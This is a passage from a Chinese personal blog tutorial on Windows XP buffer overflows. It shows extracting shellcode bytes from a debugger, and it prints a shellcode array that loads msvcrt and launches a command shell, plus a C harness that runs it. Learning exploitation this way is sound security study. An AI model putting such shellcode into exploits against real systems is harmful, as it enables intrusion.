+<p>有了上面的工作，提取ShellCode就只剩下体力活了。<br>我们对刚才的全汇编的程序，按F10进入调试，接着按下Debug工具栏的Disassembly按钮，点右键，在弹出菜单中选中Code Bytes，就出现汇编对应的机器码。<br>因为汇编可以完全完成我们的功能，所以我们把汇编对应的机器码原封不动抄下来，就得到我们想要的ShellCode了。</p>
+<p><img src="/images/windows-overflow-xp11.png" alt="windows-overflow-xp11.png"></p>
+<p>提取出来的ShellCode如下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =<span class="string">"\x55\x8B\xEC\x33\xC0\x50\x50\x50"</span></div><div class="line"><span class="string">"\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63"</span></div><div class="line"><span class="string">"\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C"</span></div><div class="line"><span class="string">"\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA"</span></div><div class="line"><span class="string">"\x7B\x1D\x80\x7C"</span></div><div class="line"><span class="string">"\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57"</span></div><div class="line"><span class="string">"\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D"</span></div><div class="line"><span class="string">"\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E"</span></div><div class="line"><span class="string">"\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8"</span></div><div class="line"><span class="string">"\xC7\x93\xC2\x77"</span></div><div class="line"><span class="string">"\xFF\xD0"</span>;</div></pre></td></tr></table></figure>
+<p>最后要验证提取出来的ShellCode能否完成我们的功能。<br>在以前的文章中已经说过方法，只需要新建一个工程和c源文件，然后把ShellCode部分拷下来，存为一个数组，最后在main中添上( (void(*)(void)) &amp;shellcode )()，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =<span class="string">"\x55\x8B\xEC\x33\xC0\x50\x50\x50"</span></div><div class="line"><span class="string">"\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63"</span></div><div class="line"><span class="string">"\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C"</span></div><div class="line"><span class="string">"\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA"</span></div><div class="line"><span class="string">"\x7B\x1D\x80\x7C"</span></div><div class="line"><span class="string">"\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57"</span></div><div class="line"><span class="string">"\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D"</span></div><div class="line"><span class="string">"\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E"</span></div><div class="line"><span class="string">"\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8"</span></div><div class="line"><span class="string">"\xC7\x93\xC2\x77"</span></div><div class="line"><span class="string">"\xFF\xD0"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ( (<span class="keyword">void</span>(*)(<span class="keyword">void</span>)) &amp;shellcode )();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>( (void(*)(void)) &amp;shellcode )()这句话是关键，它把ShellCode转换成一个参数为空，返回为空的函数指针，并调用它。<br>执行那句就相当于执行ShellCode数组里的那些数 据。如果ShellCode正确，就会完成我们想要的功能，出现一个DOS窗口。<br>我们亲自编写的第一个ShellCode成功完成！</p>
+<p><img src="/images/windows-overflow-xp12.png" alt="windows-overflow-xp12.png"></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows/" rel="tag"># windows</a>
+          
+            <a href="/tags/xp/" rel="tag"># xp</a>
+          
+            <a href="/tags/overflow/" rel="tag"># overflow</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/31/php-RFI-LFI-protocol/" rel="next" title="PHP文件包含以及部分封装协议的学习">
+                <i class="fa fa-chevron-left"></i> PHP文件包含以及部分封装协议的学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/11/22/docker/" rel="prev" title="Docker 学习">
+                Docker 学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/orleven.jpg"
+               alt="Orleven" />
+          <p class="site-author-name" itemprop="name">Orleven</p>
+           
+              <p class="site-description motion-element" itemprop="description">Life is full of ups and downs.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index-1.html">
+                <span class="site-state-item-count">31</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/orleven" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.weibo.com/u/3846125587" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#目标代码"><span class="nav-number">2.</span> <span class="nav-text">目标代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#步骤"><span class="nav-number">3.</span> <span class="nav-text">步骤</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Orleven</span>
+</div>
+
+
+<div class="powered-by">
+    个人专属
+</div>
+
+<div class="theme-info">
+  Orleven Blog 
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
